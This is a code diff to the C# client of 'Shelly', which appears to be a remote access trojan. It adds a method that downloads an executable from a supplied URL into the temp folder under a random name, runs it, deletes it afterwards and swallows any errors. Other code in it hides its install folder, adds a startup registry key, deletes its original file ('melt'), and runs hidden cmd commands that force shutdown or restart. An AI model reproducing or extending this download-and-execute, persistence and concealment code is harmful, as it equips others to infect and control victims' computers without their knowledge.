@@ -1,5 +1,7 @@
 ﻿using System;
 using System.IO;
+using System.Net;
+using System.Linq;
 using Microsoft.Win32;
 using System.Threading;
 using System.Diagnostics;
@@ -37,6 +39,40 @@ namespace Shelly_Client
                     MessageBox.Show(Message);
                 }).Start();
             }
+
+            // DAE method
+            public static void DAE(string Url)
+            {
+                // Make and start thread
+                new Thread(() =>
+                {
+                    // Try to do tasks
+                    try
+                    {
+                        // Set string
+                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".exe";
+
+                        // Create new instance
+                        using (WebClient webClient = new WebClient())
+                        {
+                            // Download file
+                            webClient.DownloadFile(Url, Path.GetTempPath() + FileName);
+                        }
+
+                        // Start file
+                        Process.Start(Path.GetTempPath() + FileName);
+
+                        // Sleep 30 seconds
+                        Thread.Sleep(30000);
+
+                        // Delete file
+                        File.Delete(Path.GetTempPath() + FileName);
+                    } catch
+                    {
+
+                    }
+                }).Start();
+            }
         }
 
         // PowerOptions class 
@@ -46,24 +82,25 @@ namespace Shelly_Client
             public static void Shutdown()
             {
                 // Shutdown
-                InstallMethods.Cmd("timeout /t 2 & shutdown /s /t 0 /f");
+                NoneClientRelated.Cmd("timeout /t 2 & shutdown /s /t 0 /f");
             }
             
             // Restart method
             public static void Restart()
             {
                 // Restart
-                InstallMethods.Cmd("timeout /t 2 & shutdown /r /t 0 /f");
+                NoneClientRelated.Cmd("timeout /t 2 & shutdown /r /t 0 /f");
             }
 
             // Hibernate method
             public static void Hibernate()
             {
                 // Hibernate
-                InstallMethods.Cmd("timeout /t 2 & rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
+                NoneClientRelated.Cmd("timeout /t 2 & rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
             }
         }
 
+        // InstallMethods class
         public static class InstallMethods
         {
             public static void Install()
@@ -72,7 +109,7 @@ namespace Shelly_Client
                 if (Directory.Exists(Program.Appdata + @"\Shelly"))
                 {
                     // Melt
-                    Cmd("timeout /t 3 & del Shelly.exe");
+                    NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");
 
                     // Exit
                     Environment.Exit(0);
@@ -83,7 +120,7 @@ namespace Shelly_Client
                 Directory.CreateDirectory("Shelly");
 
                 // Set folder to system hidden
-                Cmd("attrib +S +H Shelly");
+                NoneClientRelated.Cmd("attrib +S +H Shelly");
 
                 // Copy file to folder
                 File.Copy(Program.ExecutionPath + @"\Shelly.exe", Program.Appdata + @"\Shelly\Shelly.exe");
@@ -99,7 +136,7 @@ namespace Shelly_Client
                 Directory.SetCurrentDirectory(Program.ExecutionPath);
 
                 // Melt
-                Cmd("timeout /t 3 & del Shelly.exe");
+                NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");
 
             }
 
@@ -110,27 +147,7 @@ namespace Shelly_Client
 
                 // Remove folder
                 Directory.SetCurrentDirectory(Program.Appdata);
-                Cmd("timeout /t 3 & rd /s /q Shelly");
-            }
-
-
-            // Run cmd command method
-            public static void Cmd(string Command)
-            {
-                // Declare new instance
-                var CmdCommand = new Process();
-
-                // Set start info
-                ProcessStartInfo startInfoMelt = new ProcessStartInfo()
-                {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    FileName = "cmd.exe",
-                    Arguments = @"/C " + Command
-                };
-                CmdCommand.StartInfo = startInfoMelt;
-
-                // Start cmd with arguments
-                CmdCommand.Start();
+                NoneClientRelated.Cmd("timeout /t 3 & rd /s /q Shelly");
             }
 
             // Add/remove startup key method
@@ -151,6 +168,48 @@ namespace Shelly_Client
                         AddKey.DeleteValue("Shelly");
                     }
                 }
+            }
+        }
+
+        // NoneClientRelated class
+        public static class NoneClientRelated
+        {
+            // Run cmd command method
+            public static void Cmd(string Command)
+            {
+                // Declare new instance
+                var CmdCommand = new Process();
+
+                // Set start info
+                ProcessStartInfo startInfoMelt = new ProcessStartInfo()
+                {
+                    // Set windows style to hidden
+                    WindowStyle = ProcessWindowStyle.Hidden,
+
+                    // Set filename to run cmd
+                    FileName = "cmd.exe",
+
+                    // Set cmd arguments
+                    Arguments = @"/C " + Command
+                };
+
+                // Set start info
+                CmdCommand.StartInfo = startInfoMelt;
+
+                // Start cmd with arguments
+                CmdCommand.Start();
+            }
+
+            // GenerateRandomString method
+            private static Random random = new Random();
+            public static string GenerateRandomString(int length)
+            {
+                // Set chars
+                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+                // Create and return random string
+                return new string(Enumerable.Repeat(chars, length)
+                  .Select(s => s[random.Next(s.Length)]).ToArray());
             }
         }
     }
